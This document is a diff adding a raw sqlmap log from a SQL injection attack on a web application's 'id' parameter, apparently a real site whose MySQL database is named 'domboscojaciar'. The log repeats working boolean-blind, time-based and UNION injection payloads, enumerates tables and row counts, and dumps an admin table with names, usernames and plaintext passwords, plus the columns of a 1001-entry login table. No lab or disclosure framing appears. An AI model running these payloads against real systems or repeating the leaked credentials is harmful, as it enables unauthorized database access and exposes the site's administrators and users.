@@ -1,0 +1,186 @@
+sqlmap identified the following injection point(s) with a total of 214 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pg=ver_editorial&id=1 AND 3706=3706
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: pg=ver_editorial&id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 14 columns
+    Payload: pg=ver_editorial&id=-8076 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b717a71,0x4964614e4661584873476c596b6d534e696a42556568586a556d574d66594d5961444e62754a6744,0x71766b6b71),NULL,NULL,NULL,NULL,NULL,NULL-- nYWl
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] domboscojaciar
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pg=ver_editorial&id=1 AND 3706=3706
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: pg=ver_editorial&id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 14 columns
+    Payload: pg=ver_editorial&id=-8076 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b717a71,0x4964614e4661584873476c596b6d534e696a42556568586a556d574d66594d5961444e62754a6744,0x71766b6b71),NULL,NULL,NULL,NULL,NULL,NULL-- nYWl
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: domboscojaciar
+[10 tables]
++---------------------+
+| grcd_admin          |
+| grcd_categoria      |
+| grcd_login          |
+| grcd_login_f        |
+| grcd_menu           |
+| grcd_menu_item      |
+| grcd_publicacao     |
+| grcd_publicacao_img |
+| grcd_secao          |
+| grcd_topo           |
++---------------------+
+
+Database: domboscojaciar
++---------------------+---------+
+| Table               | Entries |
++---------------------+---------+
+| grcd_publicacao_img | 14152   |
+| grcd_login          | 1001    |
+| grcd_publicacao     | 898     |
+| grcd_login_f        | 30      |
+| grcd_categoria      | 6       |
+| grcd_secao          | 6       |
+| grcd_admin          | 5       |
++---------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pg=ver_editorial&id=1 AND 3706=3706
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: pg=ver_editorial&id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 14 columns
+    Payload: pg=ver_editorial&id=-8076 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b717a71,0x4964614e4661584873476c596b6d534e696a42556568586a556d574d66594d5961444e62754a6744,0x71766b6b71),NULL,NULL,NULL,NULL,NULL,NULL-- nYWl
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: domboscojaciar
+Table: grcd_admin
+[5 entries]
++--------+---------+----------+----------+----------+
+| codigo | nm_nome | tp_tipou | nm_admin | nm_senha |
++--------+---------+----------+----------+----------+
+| 1      | Edson   | 1        | admin    | a        |
+| 9      | Leandro | 2        | leandro  | 123      |
+| 8      | Cris    | 2        | cris     | 123      |
+| 10     | milene  | 2        | milene   | 123      |
+| 11     | judite  | 2        | judite   | 123      |
++--------+---------+----------+----------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pg=ver_editorial&id=1 AND 3706=3706
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: pg=ver_editorial&id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 14 columns
+    Payload: pg=ver_editorial&id=-8076 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b717a71,0x4964614e4661584873476c596b6d534e696a42556568586a556d574d66594d5961444e62754a6744,0x71766b6b71),NULL,NULL,NULL,NULL,NULL,NULL-- nYWl
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: domboscojaciar
+[10 tables]
++---------------------+
+| grcd_admin          |
+| grcd_categoria      |
+| grcd_login          |
+| grcd_login_f        |
+| grcd_menu           |
+| grcd_menu_item      |
+| grcd_publicacao     |
+| grcd_publicacao_img |
+| grcd_secao          |
+| grcd_topo           |
++---------------------+
+
+Database: domboscojaciar
++---------------------+---------+
+| Table               | Entries |
++---------------------+---------+
+| grcd_publicacao_img | 14152   |
+| grcd_login          | 1001    |
+| grcd_publicacao     | 898     |
+| grcd_login_f        | 30      |
+| grcd_categoria      | 6       |
+| grcd_secao          | 6       |
+| grcd_admin          | 5       |
++---------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pg=ver_editorial&id=1 AND 3706=3706
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: pg=ver_editorial&id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 14 columns
+    Payload: pg=ver_editorial&id=-8076 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b717a71,0x4964614e4661584873476c596b6d534e696a42556568586a556d574d66594d5961444e62754a6744,0x71766b6b71),NULL,NULL,NULL,NULL,NULL,NULL-- nYWl
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: domboscojaciar
+Table: grcd_login
+[5 columns]
++------------+--------------+
+| Column     | Type         |
++------------+--------------+
+| codigo     | int(11)      |
+| de_infor   | varchar(100) |
+| dt_data    | date         |
+| nm_senha   | varchar(10)  |
+| nm_usuario | varchar(100) |
++------------+--------------+
+
